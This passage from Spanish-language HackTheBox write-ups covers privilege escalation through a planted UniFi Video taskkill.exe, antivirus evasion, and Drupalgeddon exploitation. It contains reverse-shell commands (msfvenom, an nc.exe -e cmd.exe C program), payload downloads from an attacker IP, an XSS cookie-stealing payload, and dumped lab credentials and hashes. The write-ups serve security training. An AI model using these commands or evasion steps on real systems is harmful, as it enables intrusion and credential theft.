uso de la interfaz web.  Si una nos falla o algo as√≠, ya tenemos un respaldo :P sigamos‚Ä¶ ‚Ä¶ Escalada de privilegios #: En el directorio en el que salimos cuando obtenemos nuestra PowerShell vemos un archivo con un nombre algo extra√±o: *Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir  Directory: C:\Users\Stacy\DocumentsMode        LastWriteTime     Length Name----        -------------     ------ -----a----    6/17/2018  9:36 AM       6 unifivideo. . . Me dio curiosidad y busqu√© que era eso, la curiosidad nos dio vida:  ‚Äúunifi-video‚Äù, tambien llamado ‚ÄúUniFi‚Äù es una solucion de video vigilancia, o sea, de camaras de seguridad. Si le agregamos a nuestra b√∫squeda  exploit  vemos algo interesante: Lindo, un exploit que nos permite escalar privilegios, es m√°s o menos viejito (concuerda con las fechas de la m√°quina) as√≠ que ve√°moslo a ver que nos comenta.  Ubiquiti UniFi Video 3. 7. 3 - Local Privilege Escalation. Tenemos varias cosas a destacar:  Ubiquiti UniFi Video for Windows is installed to C:\ProgramData\\unifi-video\ by default. Validemos si efectivamente existe la ruta y tiene el contenido del programa: *Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir C:\ProgramData\\unifi-video\  Directory: C:\ProgramData\\unifi-videoMode        LastWriteTime     Length Name----        -------------     ------ ----d-----    6/16/2018  9:54 PM        bind-----    6/16/2018  9:55 PM        confd-----    6/16/2018 10:56 PM        datad-----    6/16/2018  9:54 PM        emaild-----    6/16/2018  9:54 PM        fwd-----    6/16/2018  9:54 PM        libd-----    7/26/2018 11:23 AM        logsd-----    6/16/2018  9:55 PM        webappsd-----    6/16/2018  9:55 PM        work-a----    7/26/2017  6:10 PM     219136 avService. exe-a----    6/17/2018 11:23 AM     31685 hs_err_pid1992. log-a----    6/17/2018 11:23 AM   534204321 hs_err_pid1992. mdmp-a----    8/16/2018  7:48 PM     270597 hs_err_pid2036. mdmp-a----    6/16/2018  9:54 PM      780 Ubiquiti UniFi Video. lnk-a----    7/26/2017  6:10 PM     48640 UniFiVideo. exe-a----    7/26/2017  6:10 PM     32038 UniFiVideo. ico-a----    6/16/2018  9:54 PM     89050 Uninstall. exe. . . Perfecto, vamos bien :)  Default permissions on the C:\ProgramData\\unifi-video folder are inherited from C:\ProgramData and are not explicitly overridden, which allows all users, even unprivileged ones, to append and write files to the application directory. Validemos si es cierto que tenemos permisos de escritura con ayuda de icacls: *Evil-WinRM* PS C:\ProgramData&gt; icacls unifi-videounifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)      BUILTIN\Administrators:(I)(OI)(CI)(F)      CREATOR OWNER:(I)(OI)(CI)(IO)(F)      BUILTIN\Users:(I)(OI)(CI)(RX)      BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)Successfully processed 1 files; Failed processing 0 filesPues si, como BUILTIN\Users tenemos varios permisos, pero los interesantes son:  WD: ‚Äúescribir datos/agregar archivo‚Äù.  AD: ‚Äúanexar datos/agregar subdirectorio‚Äù. Les dejo una lista de los permisos que encontramos y su significado. Vamos a√∫n mejor, veamos de que nos sirve saber esto:  Upon start and stop of the service, it tries to load and execute the file at C:\ProgramData\\unifi-video\taskkill. exe. However this file does not exist in the application directory by default at all. Y llega el remate:  By copying an arbitrary taskkill. exe to C:\ProgramData\\unifi-video\ as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM. :o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de msfvenom llamado taskkill. exe y posicionarlo en la ruta C:\ProgramData\\unifi-video\. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo taskkill. exe, lo ejecute y ver como obtenemos nuestra Shell (: D√©mosleeeeeeeeeeeeeeeeeeeeeeeeeeeee. ‚Ä¶ Generamos archivo taskkill. exe malicioso üîó: Creemos nuestro binario taskkill. exe con ayuda de msfvenom, le indicaremos que una vez se ejecute env√≠e una petici√≥n hacia X puerto con una CMD, o sea, generamos una Reverse Shell: ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 5 LPORT=4433 -f exe &gt; taskkill. exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesListo, ya lo tenemos, sigamos‚Ä¶ Buscamos servicio relacionado con unifi-video üîó: Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar espec√≠ficamente alguno relacionado con unifi-video. Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores: *Evil-WinRM* PS C:\ProgramData&gt; net startnet. exe : System error 5 has occurred. . . . Access is denied. *Evil-WinRM* PS C:\ProgramData&gt; wmic service list briefWMIC. exe : ERROR:. . . Description = Access denied*Evil-WinRM* PS C:\ProgramData&gt; Get-ServiceCannot open Service Control Manager on computer '. '. This operation might require other privileges. . . .  Tomadas de Hacktricks. xyz - WinPrivEsc/Services. As√≠ que tamos tristes :( Buscando en internet maneras de detener o iniciar procesos con PowerShell, encontramos dos herramientas:  Powershell: How to Start (start-service) or Stop (stop-service) services. Pero seguimos igual, no sabemos el nombre del servicio‚Ä¶ Probando algunos randoms siempre recibimos un error, por ejemplo buscando unifi-video como nombre de servicio: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service  unifi-video Cannot find any service with service name 'unifi-video'. . . . :( Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre Ubiquiti UniFi Video: As√≠ que podemos probar con ese nombre, si no nos funciona ya tendr√≠amos una base para quitar, agregar, modificar o juntar palabras en busca de alg√∫n nombre para el servicio. *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service  Ubiquiti UniFi Video Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . OPAAAAAAAAAAAAAAA, si se√±orrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra reverse Shell: Subimos el binario al sistema de diferentes maneras üîó: Aprovechemos y subamos el binario de 3 formas, con certutil. exe, con una de las opciones de PowerShell yyy con ayuda de una carpeta compartida por SMB: Levantemos un servidor web con Python en la ruta donde tenemos el archivo taskkill. exe: ‚ù± python3 -m http. servercertutil. exe:*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; certutil. exe -f -urlcache -split http://10. 10. 14. 5:8000/taskkill. exe taskkill. exe**** Online **** 000000 . . .  01204aCertUtil: -URLCache command completed successfully. Y ya lo tendriamos (: Usando la clase InvokeWebRequest de PowerShell:*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/taskkill. exe -OutFile taskkill. exeY tambien ya tendriamos el binario en la m√°quina victima. Compartiendo una carpeta con SMB:‚ù± smbserver. py smbFolder $(pwd)Ya tendr√≠amos nuestra carpeta compartida llamada smbFolder situada en la ruta del binario taskkill. exe, ahora desde la m√°quina v√≠ctima le decimos que se conecte a esa carpeta, pero que adem√°s haga una copia de uno de sus archivos a la ruta actual: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; copy \\10. 10. 14. 5\smbFolder\taskkill. exe taskkill. exeRecibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo taskkill. exe (: Listos, ahora si explotemos estooooo. Pongamonos en escucha por el puerto 4433 que fue el que indicamos en nuestro binario malicioso: ‚ù± nc -lvp 4433Intentamos que el servicio unifi-video ejecute el binario malicioso üîó: Jugando con el binario y el servicio:  Stop-Service  Ubiquiti UniFi Video  Start-Service  Ubiquiti UniFi Video No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra taskkill. exe, si intentamos nosotros mismo ejecutarlo obtenemos esto: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; . \taskkill. exeProgram 'taskkill. exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1. . . Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo √©s :P) y por consiguiente esta siendo borrado‚Ä¶ Esto puede ser obra del antivirus, el propio Windows Defender o incluso de alg√∫n App Locker. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :) ‚Ä¶ Bypasseamos Antivirus, Windows Defender, App Locker y lo que se venga üîó: Fail con Phantom EvasionBuscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese √∫ltimo se llama Phantom Evasion, una herramienta para eso, evadir cositas como los antivirus.  Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo :P Hay varios recursos que hablan de ella:  YT - Evasi√≥n de antivirus con Phantom Evasion.  C√≥mo evadir protecci√≥n antivirus con Phantom Payloads. Despu√©s de descargarlo, en su ejecuci√≥n la interfaz es sencilla: Obviaremos algunas opciones, vamos a irnos por el n√∫mero 1 directamente: Ac√° (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opci√≥n, o sea escribimos 2, esta opci√≥n nos generar√≠a un binario que al ser ejecutado con √©xito devolver√≠a una falsa shell, es funcional para saber que tenemos ejecuci√≥n de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan. Entonces, seleccionamos la opci√≥n 2, nos devolver√° la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:  LHOST: Nuestra IP, 10. 10. 14. 5.  LPORT: El puerto donde vamos a estar en escucha, 4433.  Strip executable?: Indicamos la letra Y, para SIIIIIIIIIIIIIIIIIIIIII e. e Esto hace que el binario no sea tan pesado.  La opci√≥n del certificado me daba errores, as√≠ que la cambie por n y ya todo perfecto.  Insert output filename: taskkill. Que ser√° el nombre del binario, en la opci√≥n anterior por default esta la extensi√≥n exe, as√≠ que tamos bien. Nos responde: [&gt;] Generating code. . . [&gt;] Compiling. . . [&gt;] Strip binary. . . [&lt;&gt;] File saved in Phantom-Evasion folderY si revisamos el directorio donde ejecutamos phantom evasion vemos el binario taskkill. exe: ‚ù± file taskkill. exe taskkill. exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS WindowsListooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si a√∫n no estamos en escucha por el puerto del binario (4433) lo hacemos: ‚ù± nc -lvp 4433Subimos el binario, lo primero que vemos es que no nos lo borra, as√≠ que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo: Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo: Si si siiiiiii, recibimos una petici√≥n, por lo tanto hemos bypasseado tooooooodo todito. Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a phantom evasion como funcional, ahora solo nos quedar√≠a probar entre sus opciones y ver cu√°l nos puede devolver una verdadera shell‚Ä¶ Pero (de nuevo un peroooooo), como ya comente antes, prob√© y prob√© y nada, no logre hacer funcionar una shell‚Ä¶ ‚Ä¶ En este punto ya estaba loco locooooooo, no sab√≠a pa onde mirar, as√≠ que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Despu√©s de un rato, ca√≠ en cuenta de algo en lo que deb√≠ haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta phantom evasion. Y s√≠ nos creamos nosotros mismos un binario llamado taskkill. exe que haga lo que queramos? u. u jajaj ‚Ä¶ Pos s√≠, d√©mosle a esa idea, podemos apoyarnos del lenguaje de programaci√≥n C y su funci√≥n system();, simplemente para compilar el script a un formato v√°lido en Windows usamos la herramienta mingw-w64. A darleeeee: Entonces, si no tenemos ni idea, una b√∫squeda r√°pida en internet nos dar√° vaaarios ejemplos como base:  C Exercises: Invoke the command processor to execute a command. Lo tomamos y nos quedamos √∫nicamente con las librer√≠as, la funci√≥n main y la funci√≥n system: #include&lt;stdio. h&gt;#include&lt;stdlib. h&gt;int main () {  system();} Donde system tendr√° lo que queramos ejecutar a nivel de sistema, para no hacer m√°s largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e. e  SPOILER resoluci√≥n final  El script y el binario generado van a ser la salvaci√≥n e. e (esto no era lo que iba a escribir, pero pues me gusto, as√≠ que ah√≠ se queda). Como prueba anterior, sub√≠ el binario nc. exe a la m√°quina a ver si tambi√©n era borrado, pero no, no lo borra el sistema, as√≠ que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida: #include&lt;stdio. h&gt;#include&lt;stdlib. h&gt;int main () {  system( c:\\Users\\Stacy\\Videos\\nc. exe 10. 10. 14. 5 4433 -e cmd. exe );} Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:  How to compile executable for Windows with GCC with Linux Subsystem?. Inicialmente lo compilare para 64 bits si no nos sirve, pues lo intentamos con 32: ‚ù± x86_64-w64-mingw32-gcc taskkill. c -o taskkill. exe‚ù± file taskkill. exe taskkill. exe: PE32+ executable (console) x86-64, for MS WindowsListo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto 4433 yyyyyy jugamos con el servicio: ‚Ä¶  Me tir√© tooooooooodo lo que relacione a Ruby por instalar una herramienta que nos ayudaba con el Bypass de AV. (Y pues se fue a la p*** el evil-winrm asdjflkajsldkf√±l)  Ya lo arregl√©, tamos felices. Por no usar sandboxes o peque√±os entornos que no afecten a las gemas y dem√°s cositas. Algo m√°s aprendido jajajaj a la fuerza pero aprendido. üòá ‚Ä¶ Ahora s√≠, subamos todo a la m√°quina: ‚ù± python3 -m http. server*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/taskkill. exe -OutFile taskkill. exe*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/nc64. exe -OutFile c:\Users\Stacy\Videos\nc. exe‚ù± nc -lvp 4433Detenemos el servicio: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; stop-service  Ubiquiti UniFi Video Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . . . . Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer: PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e. e Tamos dentro del sistema como el usuario nt authority\system, el master de los masters.  Veamos las flags: IT‚ÄôS OOOOOOOOOOOOVER ‚Ä¶ Terminamos despu√©s de un largo camino, pero un camino llen√≠simo de aprendizaje, pr√°cticamente todo lo que vimos en esta m√°quina fue nuevo para m√≠, as√≠ que incre√≠ble, muy lindo lo que hicimos y lo que probamos. Sali√≥ un bello script (que inicialmente no era la idea, iba a ser muuucho m√°s sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e. e Muy linda m√°quina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos SQL y entornos super controlados, pero realmente no tanto, llega un script de visita con dos l√≠neas y destruye todo lo que ten√≠as ‚Äúcontrolado‚Äù :( Bueno basta!! Los dejo descansar y perd√≥n que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo. Nos leeremos despu√©s y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!! "
    }, {
    "id": 33,
    "url": "http://localhost:4000/htb/armageddon",
    "title": "HackTheBox - Armageddon",
    "body": "2021/07/24 - M√°quina Linux nivel f√°cil. Jugaremos con CVEs, romperemos Drupal7 para ejecutar comandos, las malas configuraciones se revelar√°n y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete snap malicioso y obtener el privesc.  TL;DR (Spanish writeup): Creada por: bertolis. ¬°Bueno bueno, a darle pues! Hola ;) en esta m√°quina inicialmente nos encontraremos con una versi√≥n de Drupal 7 vulnerable a ejecucion remota de comandos, aprovecharemos esta brecha para obtener una fake Shell y que nos sea m√°s f√°cil la enumeraci√≥n‚Ä¶ Enumerando encontraremos las credenciales del usuario de la base de datos, las usaremos para ver la data de la tabla users, en la cual existe el usuario brucetherealadmin (que es usuario del sistema), tomaremos su contrase√±a (hash) la crackearemos y probando con ella ante el servicio SSH logramos una sesi√≥n v√°lida. Finalmente validando nuestros permisos de ejecuci√≥n como usuario root, vemos que podemos correr la instrucci√≥n /usr/bin/snap install *, usaremos esto para crearnos un paquete snap malicioso que nos permita al mismo tiempo de estar instal√°ndose, una ejecuci√≥n de comandos, en este caso al estar siendo ejecutada con permisos administrativos estar√≠amos ejecut√°ndo cada comando como root. Usaremos esto para obtener una reverse Shell. . ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Tirando a vulns conocidas pero tambien algo juguetona y poco real.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬øQu√© vamo a encontra‚Äô?  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral: Apache -&gt; brucetherealadmin.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Empezaremos con un escaneo para conocer que puertos tiene abiertos la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 233 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 233# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 233 ()  Status: UpHost: 10. 10. 10. 233 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71. 74 secondsPerfecto, nos encontramos los servicios:       Puerto   Descripci√≥n         22   SSH       80   HTTP   Ahora hagamos un escaneo de scripts y versiones para tener info m√°s especifica de cada servicio encontrado: ‚ù≠ nmap -p 22,80 -sC -sV 10. 10. 10. 233 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 233Nmap scan report for 10. 10. 10. 233Host is up (0. 11s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 4 (protocol 2. 0)| ssh-hostkey: |  2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)|  256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http  Apache httpd 2. 4. 6 ((CentOS) PHP/5. 4. 16)|_http-generator: Drupal 7 (http://drupal. org)| http-robots. txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG. txt /cron. php /INSTALL. mysql. txt | /INSTALL. pgsql. txt /INSTALL. sqlite. txt /install. php /INSTALL. txt |_/LICENSE. txt /MAINTAINERS. txt|_http-server-header: Apache/2. 4. 6 (CentOS) PHP/5. 4. 16|_http-title: Welcome to Armageddon | ArmageddonService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18. 08 secondsObtenemos (varias cositas que veremos despues) por ahora:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       80   HTTP   Apache httpd 2. 4. 6   Met√°monos con cada servicio a ver por donde entrarle‚Ä¶ ‚Ä¶ En cuanto al puerto 22 y su versi√≥n no tenemos nada. Puerto 80 ‚åñ: Tenemos un panel login, donde tambi√©n podemos registrarnos‚Ä¶ Antes de empezar a recorrer la p√°gina, cre√©monos una cuenta (o intentemos) a ver que hay dentro‚Ä¶ El mensaje de error es medio interesante, ya que no nos va a dejar entrar :P Pero tambi√©n habla de que nuestra cuenta esta a la espera de ser aprobada por un administrador‚Ä¶ Con esto podr√≠amos pensar en registrarnos con alg√∫n nombre tipo: &lt;script&gt;document. write('&lt;img src= http://&lt;nuestra_ip&gt;/cualquiercosita. jpg?cookie=' + document. cookie + ' &gt;')&lt;/script&gt;Levantar√≠amos un servidor web y lanzar√≠amos esa l√≠nea para que cuando el administrador valide nuestro usuario logr√°ramos en teor√≠a obtener su cookie, pero igual al intentarlo nos detecta los caracteres extra√±os y no nos deja registrarnos‚Ä¶ Podemos volver a nuestro escaneo de nmap y fijarnos que tenemos un Drupal 7, veamos si hay algunas vulnerabilidades relacionadas con √©l‚Ä¶  Drupal es un gestor de contenidos, hecho para la publicacion pricnipalmente de articulos, que tambien permite generar foros, encuestas, blogs‚Ä¶ ¬øQu√© es Drupal? Bien, revisando la versi√≥n 7 que tenemos, nos encontramos un CVE bastante interesante‚Ä¶  Advisory Drupal 7. x and 8. x - RCE - affecting multiple subsystems with default or common module configurations.  CVE-2018-7600 Drupal before 7. 58, 8. x before 8. 3. 9, 8. 4. x before 8. 4. 6, and 8. 5. x before 8. 5. 1 allows RCE. Vale vale, malas configuraciones permiten ejecuci√≥n remota de comandos, al parecer lo llaman Drupalgeddon, profundizando encontramos algunos recursos por si les quieren echar un ojo:  Drupalgeddon Attacks Continue on Sites Missing Security Updates (CVE-2018-7600, CVE-2018-7602).  Drupalgeddon Vulnerability - What is it? Are You Impacted? (ta lindo este).  How Drupalgeddon 2 works (guapet√≥n). Ahora s√≠, veamos que exploits hay y como podemos aprovecharlos‚Ä¶ ‚Ä¶ Explotaci√≥n #: Nos encontramos bastantes, entre ellos destaqu√© 3, todos se aprovechan del envenenamiento del proceso al regenerar una contrase√±a para subir un archivo v√≠a AJAX y lograr RCE:  Ruby - https://github. com/dreadlocked/Drupalgeddon2, genera Fake Shell.  Python3 - https://github. com/pimps/CVE-2018-7600, muestra salida limpia.  Python3 - https://github. com/FireFart/CVE-2018-7600, es el m√°s f√°cil de leer, por lo tanto de entender que hace. Claramente no tenemos una Shell a√∫n, el primer recurso nos genera una Fake Shell, o sea que simula como si estuvi√©ramos en una, pero no, el claro ejemplo es si intentamos hacer cd . . no nos va a mover del directorio donde estamos. As√≠ que simplemente est√° ejecutando los comandos y nos los muestra como si fuera una Shell‚Ä¶ Despu√©s de jugar con los 3 (y otros) nos damos cuenta de que la m√°quina no tiene nc, no nos deja ejecutar ninguna reverse Shell (ni con Py, ni PHP, ni Perl, ni bash, ni etc. ), ya que obtenemos un lindo ‚Äúpermiso denegado‚Äù. (O pues yo no pude :P) Pasa lo mismo si intentamos usar cURL hacia nuestro archivo con contenido de bash‚Ä¶ As√≠ que la √∫nica opci√≥n es que debamos encontrar algo dentro de la m√°quina (podemos apoyarnos de le FakeShell) que nos permita despu√©s usar el puerto 22‚Ä¶ Ahora a enumerar‚Ä¶ ‚Ä¶ Apache -&gt; brucetherealadmin #: ( Usando el otro exploit logramos ver que servicios hay localmente, ya que el de Ruby nos da TimeOut :( ‚ù≠ python3 CVE-2018-7600/drupa7-CVE-2018-7600. py http://10. 10. 10. 233 -c  netstat -a =============================================================================|     DRUPAL 7 &lt;= 7. 57 REMOTE CODE EXECUTION (CVE-2018-7600)      ||               by pimps                   |=============================================================================[*] Poisoning a form and including it in cache. form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg[*] Poisoned form ID: form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg[*] Triggering exploit to execute: netstat -aActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 localhost:smtp     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:mysql     0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:ssh       0. 0. 0. 0:*        LISTEN. . . ) Pero no nos enfocaremos en esto, sigamos enumerando‚Ä¶ No tenemos permisos para listar el directorio /home, pero podemos ver el archivo /etc/passwd y as√≠ saber que usuarios hay en el sistema: armageddon. htb&gt;&gt; cat /etc/passwdroot:x:0:0:root:/root:/bin/bash. . . apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin. . . brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bashPerfecto, simplemente tenemos al usuario brucetherealadmin siendo relevante (que de ahora en adelante le diremos bruce :P), as√≠ que entiendo que debemos pivotear a √©l‚Ä¶ D√°ndole vueltas a los archivos que tenemos en el directorio /var/www/html nos encontramos uno con contenido llamativo: armageddon. htb&gt;&gt; ls -la sitestotal 12drwxr-xr-x. 4 apache apache  75 Jun 21 2017 . drwxr-xr-x. 9 apache apache 4096 Apr 1 01:35 . . -rw-r--r--. 1 apache apache 904 Jun 21 2017 README. txtdrwxr-xr-x. 5 apache apache  52 Jun 21 2017 alldr-xr-xr-x. 3 apache apache  67 Dec 3 12:30 default-rw-r--r--. 1 apache apache 2365 Jun 21 2017 example. sites. phparmageddon. htb&gt;&gt; ls -la sites/defaulttotal 56dr-xr-xr-x. 3 apache apache  67 Dec 3 12:30 . drwxr-xr-x. 4 apache apache  75 Jun 21 2017 . . -rw-r--r--. 1 apache apache 26250 Jun 21 2017 default. settings. phpdrwxrwxr-x. 3 apache apache  37 Dec 3 12:32 files-r--r--r--. 1 apache apache 26565 Dec 3 12:32 settings. phparmageddon. htb&gt;&gt; cat sites/default/settings. php. . . $databases = array ( 'default' =&gt; array (  'default' =&gt;  array (   'database' =&gt; 'drupal',   'username' =&gt; 'drupaluser',   'password' =&gt; 'CQHEy@9M*m23gBVj',   'host' =&gt; 'localhost',   'port' =&gt; '',   'driver' =&gt; 'mysql',   'prefix' =&gt; '',  ), ),);. . . $drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';. . . Opa, las credenciales de un usuario de la base de datos y un salt llamativo, podemos probar esa contrase√±a contra el usuario bruce por medio de SSH a ver quee: ‚ù≠ ssh brucetherealadmin@10. 10. 10. 233brucetherealadmin@10. 10. 10. 233's password: Permission denied, please try again. Pero no, as√≠ que veamos si podemos usar las herramientas relacionadas con mysql y ver si dentro de la base de datos drupal hay algo que nos sirva contra bruce. Probando mysql nos da error (al no tener una consola interactiva), podemos probar con mysqlshow para ver que bases de datos existen: armageddon. htb&gt;&gt; mysqlshow -u drupaluser -p Enter password: mysqlshow: Access denied for user 'drupaluser'@'localhost' (using password: NO)No nos permite ingresar la contrase√±a, pero en este caso haciendo una b√∫squeda r√°pida encontramos la soluci√≥n en Stack Overflow, simplemente juntamos la contrase√±a a la letra -p yyy: armageddon. htb&gt;&gt; mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj+--------------------+|   Databases   |+--------------------+| information_schema || drupal       || mysql       || performance_schema |+--------------------+Perfe, tenemos las bases de datos disponibles en el sistema‚Ä¶ Y validamos que existe drupal. Ahora podemos empezar a meternos entre la base de datos y explorar las tablas: armageddon. htb&gt;&gt; mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj drupalDatabase: drupal        +-----------------------------+|      Tables      |+-----------------------------+| actions           || authmap           |. . . | users            |. . . | users_roles         || variable          || watchdog          |+-----------------------------+Podemos ver cada tabla, pero veremos su estructura m√°s no su contenido‚Ä¶ Ac√° podemos apoyarnos de mysqldump, el cual se encarga de generar un backup de la base de datos que le indiquemos, por lo tanto va a dumpear todo el contenido y la estructura de las tablas: armageddon. htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupalEl output es gigante, peeeero como lo que nos interesa es validar el contenido de la tabla users, simplemente buscamos por eso: armageddon. htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep  users . . . CREATE TABLE `users` (-- Dumping data for table `users`. . . armageddon. htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep  Dumping data for table \`users\` -- Dumping data for table `users`armageddon. htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep  Dumping data for table \`users\`  -A 10-- Dumping data for table `users`--LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97. oOsUf1xAhaadURt','admin@armageddon. eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon. eu','a:1:{s:7:\ overlay\ ;i:1;}'),(3,'test','$S$DwIeAxnNRIh9nffiwqM. hpZpekF1HtLtbpHP1IvRoF7ASRB12D. 4','test@gmail. com','','','filtered_html',1617249869,0,0,0,'Europe/London','',0,'test@gmail. com',NULL);/*!40000 ALTER TABLE `users` ENABLE KEYS */;UNLOCK TABLES; Listos, vemos informaci√≥n √∫til sobre el usuario bruce, tenemos un hash, que 